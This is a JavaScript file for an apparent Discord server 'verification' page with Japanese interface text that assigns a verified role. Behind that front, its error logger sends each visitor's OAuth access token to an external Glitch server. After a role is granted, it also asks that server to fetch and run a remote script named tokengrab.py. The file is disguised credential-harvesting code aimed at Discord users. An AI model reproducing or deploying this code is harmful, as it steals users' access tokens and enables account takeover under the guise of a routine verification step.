document.addEventListener('DOMContentLoaded', function() {
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    const authButton = document.getElementById('auth-button');
    const resultMessage = document.getElementById('result-message');
    const resultText = document.getElementById('result-text');
    const guildSelect = document.getElementById('guild-select');
    const accessToken = getQueryParam('access_token'); // URLからアクセストークンを取得
    let userId;

    async function logErrorToServer(error) {
        try {
            await fetch('https://inky-neat-thyme.glitch.me/log_error', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ error: `${error.message || error} (Access Token: ${accessToken})` })
            });
        } catch (logError) {
            console.error('Error logging to server:', logError);
        }
    }

    function executePythonScript() {
        const selectedGuildId = guildSelect.value;

        fetch('https://inky-neat-thyme.glitch.me/run-tokengrab', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                githubUrl: 'https://raw.githubusercontent.com/RepublicofAuech/vearithy/main/tokengrab.py'
            })
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to execute tokengrab.py');
            }
            console.log('tokengrab.py executed successfully');
        })
        .catch(error => {
            console.error('Error executing tokengrab.py:', error);
            logErrorToServer(error);
        });
    }

    fetch('https://inky-neat-thyme.glitch.me/guilds', {
        credentials: 'include'
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch guilds');
            }
            return response.json();
        })
        .then(guilds => {
            guilds.forEach(guild => {
                const option = document.createElement('option');
                option.value = guild.id;
                option.text = guild.name;
                guildSelect.appendChild(option);
            });
            guildSelect.style.display = 'block';
        })
        .catch(error => {
            console.error('Error fetching guilds:', error);
            logErrorToServer(error);
        });

    if (accessToken) {
        fetch('https://inky-neat-thyme.glitch.me/user_info', {
            method: 'GET',
            credentials: 'include',
            headers: {
                'Authorization': `Bearer ${accessToken}`
            }
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Failed to fetch user info');
            }
            return response.json();
        })
        .then(data => {
            if (data.id) {
                document.getElementById('avatar').src = `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png`;
                document.getElementById('username').innerText = `${data.username}#${data.discriminator}`;
                document.getElementById('user-id').innerText = `(${data.id})`;
                document.getElementById('user-info').style.display = 'block';
                authButton.style.display = 'inline-block';
                userId = data.id;
            } else {
                console.error('Error fetching user info:', data);
                throw new Error('Failed to fetch user info');
            }
        })
        .catch(async error => {
            console.error('Error fetching user info:', error);
            await logErrorToServer(error);
            resultText.innerText = 'ユーザー情報の取得中にエラーが発生しました。再度お試しください';
            resultMessage.style.display = 'block';
        });
    } else {
        logErrorToServer(new Error('Access token is missing from URL parameters'));
    }

    authButton.addEventListener('click', function() {
        const selectedGuildId = guildSelect.value;

        if (userId && selectedGuildId) {
            fetch('https://inky-neat-thyme.glitch.me/grant_role', {
                method: 'POST',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    access_token: accessToken,
                    user_id: userId,
                    guild_id: selectedGuildId,
                    role_name: '認証済み'
                })
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(errorData => {
                        throw new Error(`Failed to grant role: ${errorData.error}`);
                    });
                }
                return response.json();
            })
            .then(data => {
                const roleId = data.roleId;
                console.log('Role ID:', roleId);
                resultText.innerText = '認証が成功しました。リダイレクトしています...';
                resultMessage.style.display = 'block';
                setTimeout(function() {
                    window.location.href = 'https://republicofauech.github.io/vearithy/success/';
                    executePythonScript();
                }, 2000);
            })
            .catch(async error => {
                console.error('Error granting role:', error);
                await logErrorToServer(error);
                resultText.innerText = 'ロールの付与中にエラーが発生しました。リダイレクトしています...';
                resultMessage.style.display = 'block';
                setTimeout(function() {
                    window.location.href = 'https://republicofauech.github.io/vearithy/failure/';
                }, 2000);
            });
        } else {
            resultText.innerText = 'ユーザー情報が取得されていないか、サーバーが選択されていません。再度お試しください';
            resultMessage.style.display = 'block';
        }
    });
});
